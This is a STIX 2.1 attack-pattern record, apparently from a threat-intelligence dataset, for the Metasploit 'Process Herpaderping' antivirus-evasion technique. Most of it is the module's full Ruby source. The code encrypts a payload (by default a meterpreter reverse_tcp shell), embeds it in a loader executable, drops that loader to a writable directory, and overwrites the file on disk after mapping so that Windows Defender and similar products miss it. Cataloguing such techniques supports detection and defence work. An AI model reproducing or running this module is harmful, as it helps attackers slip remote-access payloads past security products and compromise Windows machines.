{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f183cbc9-8ddd-4418-8811-88181fbf9803",
    "created": "2024-08-14T16:33:19.191103Z",
    "modified": "2024-08-14T16:33:19.191107Z",
    "name": "Process Herpaderping evasion technique",
    "description": " This module allows you to generate a Windows executable that evades security products such as Windows Defender, Avast, etc. This uses the Process Herpaderping technique to bypass Antivirus detection. This method consists in obscuring the behavior of a running process by modifying the executable on disk after the image has been mapped in memory (more details https://jxy-s.github.io/herpaderping/).  First, the chosen payload is encrypted and embedded in a loader Portable Executable (PE) file. This file is then included in the final executable. Once this executable is launched on the target, the loader PE is dropped on disk and executed, following the Process Herpaderping technique. Note that the name of the file that is being dropped is randomly generated. However, it is possible to configure the destination path from Metasploit (see WRITEABLE_DIR option description).  Here is the main workflow: 1. Retrieve the target name (where the PE loader will be dropped). 2. Retrieve the PE loader from the binary and write it on disk. 3. Create a section object and create a process from the mapped image. 4. Modify the file content on disk by copying another (inoffensive) executable or by using random bytes (see REPLACED_WITH_FILE option description). 5. Create the main Thread.  The source code is based on Johnny Shaw's PoC (https://github.com/jxy-s/herpaderping). ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/evasion/windows/process_herpaderping.rb",
            "external_id": "process_herpaderping.rb"
        },
        {
            "source_name": "reference",
            "url": "https://jxy-s.github.io/herpaderping/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/jxy-s/herpaderping"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'metasploit/framework/compiler/windows'\n\nclass MetasploitModule < Msf::Evasion\n\n  # These constants must match the constants defined in the PE loader code (ProcessHerpaderpingTemplate.cpp)\n  MAX_JUNK_SIZE = 1024\n  MAX_PAYLOAD_SIZE = 8192\n  MAX_KEY_SIZE = 64\n\n  def initialize(info = {})\n    super(\n      merge_info(\n        info,\n        'Name' => 'Process Herpaderping evasion technique',\n        'Description' => %q{\n          This module allows you to generate a Windows executable that evades security\n          products such as Windows Defender, Avast, etc. This uses the Process\n          Herpaderping technique to bypass Antivirus detection. This method consists in\n          obscuring the behavior of a running process by modifying the executable on disk\n          after the image has been mapped in memory (more details https://jxy-s.github.io/herpaderping/).\n\n          First, the chosen payload is encrypted and embedded in a loader Portable\n          Executable (PE) file. This file is then included in the final executable. Once\n          this executable is launched on the target, the loader PE is dropped on disk and\n          executed, following the Process Herpaderping technique. Note that the name of\n          the file that is being dropped is randomly generated. However, it is possible\n          to configure the destination path from Metasploit (see WRITEABLE_DIR option\n          description).\n\n          Here is the main workflow:\n          1. Retrieve the target name (where the PE loader will be dropped).\n          2. Retrieve the PE loader from the binary and write it on disk.\n          3. Create a section object and create a process from the mapped image.\n          4. Modify the file content on disk by copying another (inoffensive) executable\n          or by using random bytes (see REPLACED_WITH_FILE option description).\n          5. Create the main Thread.\n\n          The source code is based on Johnny Shaw's PoC (https://github.com/jxy-s/herpaderping).\n        },\n        'Author' => [\n          'Johnny Shaw', # Research and PoC\n          'Christophe De La Fuente' # MSF Module\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          [ 'URL', 'https://jxy-s.github.io/herpaderping/' ],\n          [ 'URL', 'https://github.com/jxy-s/herpaderping' ],\n        ],\n        'Platform' => 'windows',\n        'Arch' => [ ARCH_X64, ARCH_X86 ],\n        'Payload' => { 'ForceEncode' => true },\n        'Targets' => [\n          [\n            'Microsoft Windows (x64)',\n            {\n              'Arch' => ARCH_X64,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp'\n              }\n            }\n          ],\n          [\n            'Microsoft Windows (x86)',\n            {\n              'Arch' => ARCH_X86,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'windows/meterpreter/reverse_tcp'\n              }\n            }\n          ]\n        ]\n      )\n    )\n\n    register_options([\n      OptString.new('ENCODER', [\n        false,\n        'A specific encoder to use (automatically selected if not set)',\n        nil\n      ]),\n      OptString.new('WRITEABLE_DIR', [\n        true,\n        'Where to write the loader on disk',\n        '%TEMP%'\n      ]),\n      OptString.new('REPLACED_WITH_FILE', [\n        false,\n        'File to replace the target with. If not set, the target file will be '\\\n          'filled with random bytes (WARNING! it is likely to be catched by AV).',\n        '%SystemRoot%\\\\System32\\\\calc.exe'\n      ])\n    ])\n  end\n\n  def patch_binary(bin, tag, value)\n    placeholder = bin.index(tag)\n    unless placeholder\n      fail_with(Failure::BadConfig, \"Invalid source binary: missing \\\"#{tag}\\\" tag\")\n    end\n\n    bin[placeholder, value.size] = value\n    nil\n  end\n\n  def encrypt_payload\n    opts = { format: 'rc4', key: rc4_key }\n    junk = Rex::Text.rand_text(10..MAX_JUNK_SIZE)\n    p = payload.encoded + junk\n    vprint_status(\"Payload size: #{p.size} = #{payload.encoded.size} + #{junk.size} (junk)\")\n    Msf::Simple::Buffer.transform(p, 'raw', nil, opts)\n  end\n\n  def rc4_key\n    @rc4_key ||= Rex::Text.rand_text_alpha(32..MAX_KEY_SIZE)\n  end\n\n  def run\n    case target.arch.first\n    when ARCH_X64\n      arch_suffix = 'x64'\n    when ARCH_X86\n      arch_suffix = 'x86'\n    end\n\n    payload = generate_payload\n    if payload.encoded.size > MAX_PAYLOAD_SIZE\n      fail_with(Failure::BadConfig,\n                \"Payload too big: #{payload.encoded.size} bytes (max: #{MAX_PAYLOAD_SIZE})\")\n    end\n\n    base_path = ::File.join(\n      Msf::Config.data_directory,\n      'evasion',\n      'windows',\n      'process_herpaderping'\n    )\n    exe_path = ::File.join(base_path, \"ProcessHerpaderping_#{arch_suffix}.exe\")\n    exe_path = ::File.expand_path(exe_path)\n    pe = File.binread(exe_path)\n    vprint_status(\"Using #{exe_path}\")\n\n    template_path = ::File.join(base_path, \"ProcessHerpaderpingTemplate_#{arch_suffix}.exe\")\n    template_path = ::File.expand_path(template_path)\n    payload_pe = File.binread(template_path)\n    vprint_status(\"Using #{template_path}\")\n\n    patch_binary(payload_pe, 'ENCKEY', rc4_key)\n\n    vprint_status(\"RC4 key: #{rc4_key}\")\n\n    encrypted_payload = encrypt_payload\n    vprint_status(\"Encrypted payload size: #{encrypted_payload.size}\")\n\n    size_prefix = [encrypted_payload.size].pack('L<')\n    patch_binary(payload_pe, 'PAYLOAD', (size_prefix + encrypted_payload).b)\n    vprint_status(\"Payload PE size #{payload_pe.size}\")\n\n    patch_binary(pe, 'PAYLOAD', payload_pe)\n\n    target_file_name = Rex::Text.rand_text_alpha_lower(4..10)\n    target_path = datastore['WRITEABLE_DIR']\n    target_path << '\\\\' if target_path.last != '\\\\'\n    target_path << target_file_name\n    target_path << '.exe'\n    patch_binary(pe, 'TARGETFILENAME', target_path.b)\n    vprint_status(\"Target filename will be #{target_path}\")\n\n    replace_path = datastore['REPLACED_WITH_FILE']\n    if replace_path.nil? || replace_path.empty?\n      replace_path = \"\\0\"\n    end\n\n    patch_binary(pe, 'REPLACEFILENAME', replace_path.b)\n\n    file_create(pe)\n    if arch_suffix == 'x86'\n      print_warning(\n        \"#### WARNING ####\\n\"\\\n        \"This payload won't work on 32-bit Windows 10 versions from 1511 (build\\n\"\\\n        \"10586) to 1703 (build 15063), including Windows 10 2016 LTSB (build 14393).\\n\"\\\n        \"These versions have a bug in the kernel that crashes/BugCheck the OS\\n\"\\\n        \"when executing this payload. So, to avoid this, the payload won't run if\\n\"\\\n        'it detects the OS is one of these versions.'\n      )\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "windows'"
    ]
}